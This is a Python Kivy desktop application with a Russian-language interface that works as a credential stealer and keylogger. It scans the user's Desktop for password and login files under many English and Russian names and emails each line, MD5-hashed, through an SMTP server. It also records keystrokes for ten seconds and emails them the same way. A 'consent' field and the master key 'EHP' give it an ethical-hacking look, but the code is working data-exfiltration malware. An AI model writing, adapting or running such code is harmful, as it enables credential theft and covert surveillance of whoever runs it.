import os
import smtplib
import hashlib
import time
import keyboard
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout


# Объявление глобальных переменных
password_files = []
key_combination_count = 0
start_time = 0
program_start_time = time.time()

# Функция для отправки электронной почты
def send_email(subject, content, sender_email, password, receiver_email):
    message = f'Subject: {subject}\n\n{content}'

    try:
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        server.quit()
        return True
    except:
        return False

# Функция для хэширования строки по алгоритму MD5
def hash_string(string):
    hash_object = hashlib.md5(string.encode())
    return hash_object.hexdigest()

# Функция для обработки файлов на рабочем столе
def process_files(sender_email, password, receiver_email):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    files_to_search = ['pass.txt', 'password.txt', 'passwords.txt', 'пароли.txt',
                       'password_list.txt', 'passwd.txt', 'credentials.txt', 'logins.txt',
                       'accounts.txt', 'key.txt', 'keys.txt', 'usernames.txt',
                       'secret.txt', 'login.txt', 'pass_list.txt', 'credentials_list.txt',
                       'password_storage.txt', 'access.txt', 'доступ.txt', 'пароли_и_логины.txt',
                       'список_паролей.txt', 'учетные_данные.txt', 'логины_и_пароли.txt',
                       'секреты.txt', 'коды_доступа.txt', 'ключи_для_входа.txt', 'конфиденциальные_данные.txt']

    password_count = 0

    for file_name in files_to_search:
        file_path = os.path.join(desktop_path, file_name)
        if os.path.isfile(file_path):
            password_files.append(file_name)
            with open(file_path, 'r') as file:
                for line in file:
                    password_count += 1
                    hashed_line = hash_string(line.strip())
                    email_subject = 'EHP'
                    email_content = f'EHP password {hashed_line}'
                    success = send_email(email_subject, email_content, sender_email, password, receiver_email)
                    if not success:
                        popup = Popup(title='Ошибка', content=Label(text='Не удалось отправить данные на почту.'), size_hint=(None, None), size=(400, 200))
                        popup.open()
                        return

    popup = Popup(title='Успех', content=Label(text=f'Найдено {len(password_files)} файлов с паролями.\n'
                                                        f'Общее количество паролей: {password_count}.\n'
                                                        f'Названия файлов: {", ".join(password_files)}.'),
                                                        size_hint=(None, None), size=(400, 200))
    popup.open()

# Функция для обработки нажатий клавиш
def process_key_presses(sender_email, password, receiver_email):
    global key_combination_count, start_time
    key_combination = ''
    start_time = time.time()

    def on_press(event):
        nonlocal key_combination
        key_combination += event.name
        global key_combination_count
        key_combination_count += 1

    def on_release(event):
        nonlocal key_combination
        if event.event_type == keyboard.KEY_DOWN:
            key_combination += event.name
        elif event.event_type == keyboard.KEY_UP:
            key_combination = key_combination.replace(event.name, '')

    keyboard.on_press(on_press)
    keyboard.on_release(on_release)

    while time.time() - start_time <= 10:
        if keyboard.is_pressed('esc'):
            break

    keyboard.unhook_all()

    hashed_combination = hash_string(key_combination.strip())
    email_subject = 'EHP'
    email_content = f'EHP keylog {hashed_combination}'
    success = send_email(email_subject, email_content, sender_email, password, receiver_email)
    if not success:
        popup = Popup(title='Ошибка', content=Label(text='Не удалось отправить данные на почту.'), size_hint=(None, None), size=(400, 200))
        popup.open()

    popup = Popup(title='Успех', content=Label(text=f'Считанная комбинация клавиш: {key_combination}'), size_hint=(None, None), size=(400, 200))
    popup.open()

class MainApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        email_layout = GridLayout(cols=2, size_hint_y=None, height=50)
        password_layout = GridLayout(cols=2, size_hint_y=None, height=50)
        receiver_email_layout = GridLayout(cols=2, size_hint_y=None, height=50)
        master_key_layout = GridLayout(cols=2, size_hint_y=None, height=50)
        consent_layout = GridLayout(cols=2, size_hint_y=None, height=50)

        email_label = Label(text='Email:')
        self.email_input = TextInput(multiline=False)
        email_layout.add_widget(email_label)
        email_layout.add_widget(self.email_input)

        password_label = Label(text='Пароль:')
        self.password_input = TextInput(multiline=False, password=True)
        password_layout.add_widget(password_label)
        password_layout.add_widget(self.password_input)

        receiver_email_label = Label(text='Email получателя:')
        self.receiver_email_input = TextInput(multiline=False)
        receiver_email_layout.add_widget(receiver_email_label)
        receiver_email_layout.add_widget(self.receiver_email_input)

        master_key_label = Label(text='Мастер-ключ:')
        self.master_key_input = TextInput(multiline=False)
        master_key_layout.add_widget(master_key_label)
        master_key_layout.add_widget(self.master_key_input)

        consent_label = Label(text='Согласие (Да/Нет):')
        self.consent_input = TextInput(multiline=False)
        consent_layout.add_widget(consent_label)
        consent_layout.add_widget(self.consent_input)

        layout.add_widget(email_layout)
        layout.add_widget(password_layout)
        layout.add_widget(receiver_email_layout)
        layout.add_widget(master_key_layout)
        layout.add_widget(consent_layout)

        button_search = Button(text='Начать поиск файлов с паролями', on_press=self.start_search)
        layout.add_widget(button_search)

        button_keylogger = Button(text='Запустить кейлоггер', on_press=self.start_keylogger)
        layout.add_widget(button_keylogger)

        button_statistics = Button(text='Вывести статистику', on_press=self.show_statistics)
        layout.add_widget(button_statistics)

        button_close = Button(text='Закрыть программу', on_press=self.close_program)
        layout.add_widget(button_close)

        return layout

    def check_fields(self, email, password, receiver_email, master_key, consent):
        if not email or not password or not receiver_email or not master_key or not consent:
            popup = Popup(title='Ошибка', content=Label(text='Пожалуйста, заполните все поля.'), size_hint=(None, None), size=(400, 200))
            popup.open()
            return False

        if consent.lower() not in ['да', 'нет']:
            popup = Popup(title='Ошибка', content=Label(text='Неверный формат согласия. Введите "Да" или "Нет".'), size_hint=(None, None), size=(400, 200))
            popup.open()
            return False

        if master_key != 'EHP':
            popup = Popup(title='Ошибка', content=Label(text='Неправильный мастер-ключ.'), size_hint=(None, None), size=(400, 200))
            popup.open()
            return False

        return True

    def start_search(self, instance):
        email = self.email_input.text
        password = self.password_input.text
        receiver_email = self.receiver_email_input.text
        master_key = self.master_key_input.text
        consent = self.consent_input.text

        if self.check_fields(email, password, receiver_email, master_key, consent):
            if consent.lower() == 'да':
                process_files(email, password, receiver_email)
            else:
                popup = Popup(title='Уведомление', content=Label(text='Согласие не было получено. Программа не будет работать.'), size_hint=(None, None), size=(400, 200))
                popup.open()

    def start_keylogger(self, instance):
        email = self.email_input.text
        password = self.password_input.text
        receiver_email = self.receiver_email_input.text
        master_key = self.master_key_input.text
        consent = self.consent_input.text

        if self.check_fields(email, password, receiver_email, master_key, consent):
            if consent.lower() == 'да':
                process_key_presses(email, password, receiver_email)
            else:
                popup = Popup(title='Уведомление', content=Label(text='Согласие не было получено. Программа не будет работать.'), size_hint=(None, None), size=(400, 200))
                popup.open()

    def show_statistics(self, instance):
        global password_files, key_combination_count, program_start_time
        popup = Popup(title='Статистика', content=Label(text=f'Количество файлов с паролями: {len(password_files)}\n'
                                                              f'Общее количество считанных клавиш: {key_combination_count}\n'
                                                              f'Время работы программы: {time.time() - program_start_time}'), size_hint=(None, None), size=(400, 200))
        popup.open()

    def close_program(self, instance):
        exit()

# Начало выполнения программы
if __name__ == '__main__':
    MainApp().run()